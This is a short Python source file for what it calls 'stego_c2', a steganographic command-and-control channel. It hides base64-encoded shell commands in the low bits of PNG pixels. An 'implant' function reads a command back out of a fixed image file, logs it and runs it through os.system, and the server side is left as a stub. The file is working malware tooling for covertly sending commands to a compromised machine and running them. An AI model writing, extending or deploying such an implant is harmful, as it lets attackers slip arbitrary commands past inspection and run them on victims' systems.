from PIL import Image
import base64
from io import BytesIO
import os

def embed_command_in_image(command, input_path, output_path):
    img = Image.open(input_path).convert("RGB")
    data = list(img.getdata())
    b_command = base64.b64encode(command.encode()).decode()
    b_command += "EOF"  # end marker

    bits = ''.join([format(ord(c), '08b') for c in b_command])
    if len(bits) > len(data) * 3:
        raise ValueError("Command too large to embed")

    new_data = []
    bit_index = 0
    for pixel in data:
        r, g, b = pixel
        if bit_index < len(bits):
            r = (r & ~1) | int(bits[bit_index])
            bit_index += 1
        if bit_index < len(bits):
            g = (g & ~1) | int(bits[bit_index])
            bit_index += 1
        if bit_index < len(bits):
            b = (b & ~1) | int(bits[bit_index])
            bit_index += 1
        new_data.append((r, g, b))

    img.putdata(new_data)
    img.save(output_path, format="PNG")


def extract_command_from_image(path):
    img = Image.open(path)
    data = list(img.getdata())
    bits = ""
    for pixel in data:
        for color in pixel[:3]:
            bits += str(color & 1)

    chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)]
    result = ''.join(chars)
    return base64.b64decode(result.split("EOF")[0]).decode()

def run_stego_server(verbose=False):
    print("[stego_c2] Stub server mode: deliver encoded image manually.")

def run_stego_implant(verbose=False):
    path = "test_vectors/encoded_command.png"
    cmd = extract_command_from_image(path)

    # Log extracted command
    with open("output/extracted_commands.txt", "a") as f:
        f.write(cmd + "\n")

    if verbose:
        print(f"[stego_c2] Extracted command: {cmd}")
    os.system(cmd)
